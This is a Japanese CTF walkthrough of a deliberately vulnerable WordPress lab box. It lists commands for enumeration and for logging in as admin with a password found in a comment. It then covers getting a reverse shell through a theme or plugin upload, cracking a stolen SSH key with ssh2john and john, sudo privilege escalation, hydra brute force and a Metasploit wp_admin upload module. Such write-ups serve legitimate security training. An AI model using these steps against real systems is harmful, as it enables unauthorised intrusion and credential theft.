### 論点
- wp_admin,典型的なwordpress攻略
### keyword
- cewl,404.php,wpcan,ssh2john


## 攻略
- nmapする
  - 22,80他は特に情報なし
- サイトを見ると、ドメインネームを設定するよう指示がある
  - `http://~`をつけないとサイトが見れない。理由はよくわからん
- gobusterすると/wordpressが出てくる
  - `gobuster dir -w $dirsmall -u http://coffeeaddicts.thm` 
- wpscan
  - `wpscan --url http://coffeeaddicts.thm/wordpress -e u,ap`
  - gusというユーザがいる
  - pluginは特にない

- サイトのコメントを見るとパスワードとユーザのヒントがわかる
  - gus:gusineedyouback 
- ダッシュボードにログインする
- (試してみる wordpressの404.phpに書き込む)
  - Appearance->Theme Editor->404 Templateにphp-reverse-shell.phpに書き込む
  - `upload File`を押しても失敗する 

- pluginをuploadしてreverse-shellをする。Deathnoteを参照する

- 対話型シェルにする
- ユーザを調べる
  - `ls -l /home`
  - badbyte,gusがいる 
- /home/badbyteに.sshのid_rsaがあるのでコピーして使う。権限を変える
  - `chmod 700 id_rsa` 
- `ssh -i id_rsa badbyte@$IP`
  - sshするとパスワードが求めらる
- `ssh2john id_rsa > hash.txt`
- `sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
- sshする
- sudo -l
  - `sudo /opt/BadBytes/shell -i`
  - `bash -p`

 ## 課題
 - pkexec 0.105,gccもあるのでrootに使える
- (試してみる cewlとhydra)
  - `cewl -d 2 http://coffeeaddicts.thm/wordpress > cewl.txt` 
  - `hydra -l gus -P cewl.txt ssh://$IP`
  - 何も見つからない

### msfconsoleで侵入する
- gusはこのサイトの管理者なので、pluginをuploadすることはできる。ここでは、msfconsoleを使って同じことをする
  - msfconsole -q
  - search wp_admin
  - use 0
  - set rhosts coffeeaddicts.thm
  - set lhost 192.168.56.104
  - set targeturi /wordpress
  - set password gusineedyouback
  - set username gus
  - run
